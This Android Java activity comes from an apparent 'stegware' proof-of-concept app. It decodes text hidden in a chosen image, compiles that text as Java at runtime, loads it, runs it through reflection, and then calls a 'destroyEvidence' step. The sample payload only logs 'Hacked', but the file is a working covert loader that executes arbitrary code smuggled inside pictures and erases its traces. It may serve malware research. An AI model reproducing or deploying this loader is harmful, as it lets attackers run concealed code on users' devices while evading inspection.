package com.android.stegware_app;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.android.stegware_app.compile_utility.Compile;
import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
import com.ayush.imagesteganographylibrary.Text.TextDecoding;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import javassist.NotFoundException;

public class Decode extends AppCompatActivity implements TextDecodingCallback {

    private static final int SELECT_PICTURE = 100;
    private static final String TAG = "DecodeClass";

    //Initializing the UI components
    private TextView textView;
    private ImageView imageView;
    private EditText message;
    private EditText secret_key;
    private Uri filepath;

    //Bitmap
    private Bitmap original_image;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_decode);

        //Instantiation of UI components
        textView = findViewById(R.id.whether_decoded);

        imageView = findViewById(R.id.imageview);

        message = findViewById(R.id.message);
        secret_key = findViewById(R.id.secret_key);

        Button choose_image_button = findViewById(R.id.choose_image_button);
        Button decode_button = findViewById(R.id.decode_button);

        Button compile = findViewById(R.id.dynamic_compile);

        //Choose Image Button
        choose_image_button.setOnClickListener(view -> ImageChooser());

        //Decode Button
        decode_button.setOnClickListener(view -> {
            if (filepath != null) {

                //Making the ImageSteganography object
                ImageSteganography imageSteganography = new ImageSteganography(secret_key.getText().toString(), original_image);

                //Making the TextDecoding object
                TextDecoding textDecoding = new TextDecoding(Decode.this, Decode.this);

                //Execute Task
                textDecoding.execute(imageSteganography);

                Log.d(TAG, "Image code: " + imageSteganography.getMessage());
            }
        });

        compile.setOnClickListener(view -> {
            String code = "import android.util.Log; import android.content.Context; class RuntimeClass { public RuntimeClass() {} public String run(Context context) { Log.d(\"TAG_HACK\", \"Hacked\"); return \"Hacked!\"; } }";

            dynamicCompiling(getApplicationContext(), code);
        });
    }

    private void ImageChooser() {
        Intent intent = new Intent();
        intent.setType("image/*");
        intent.setAction(Intent.ACTION_GET_CONTENT);

        startActivityForResult(Intent.createChooser(intent, "Select Picture"), SELECT_PICTURE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //Image set to imageView
        if (requestCode == SELECT_PICTURE && resultCode == RESULT_OK && data != null && data.getData() != null) {

            filepath = data.getData();

            try {
                original_image = MediaStore.Images.Media.getBitmap(getContentResolver(), filepath);

                imageView.setImageBitmap(original_image);
            } catch (IOException e) {
                Log.d(TAG, "Error : " + e);
            }
        }
    }

    @Override
    public void onStartTextEncoding() {
        //Whatever you want to do by the start of textDecoding
    }

    @Override
    public void onCompleteTextEncoding(ImageSteganography result) {

        //By the end of textDecoding

        if (result != null) {
            if (!result.isDecoded())
                textView.setText("No message found");
            else {
                if (!result.isSecretKeyWrong()) {
                    textView.setText("Decoded");
                    message.setText("" + result.getMessage());

                    Log.d(TAG, "res: " + result.getMessage());

//                    String code = "import android.util.Log; import android.content.Context; class RuntimeClass { public RuntimeClass() {} public String run(Context context) { Log.d(\"TAG_HACK\", \"Hacked\"); return \"Hacked!\"; } }";

                    dynamicCompiling(getApplicationContext(), result.getMessage());
                } else {
                    textView.setText("Wrong secret key");
                }
            }
        } else {
            textView.setText("Select Image First");
        }
    }

    private void dynamicCompiling(Context context, String code) {
        Compile compile = new Compile(context.getFilesDir(), context, code);

        try {
            compile.parseSourceCode();
            compile.assemblyCompile();
            compile.compile();
            compile.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
            Object obj = compile.run();

            String _result = "";

            Method method = obj.getClass().getDeclaredMethod("run", Context.class);
            _result = (String) method.invoke(obj, context);

            compile.destroyEvidence();

            Log.d(TAG, "Method res: " + _result);
        } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
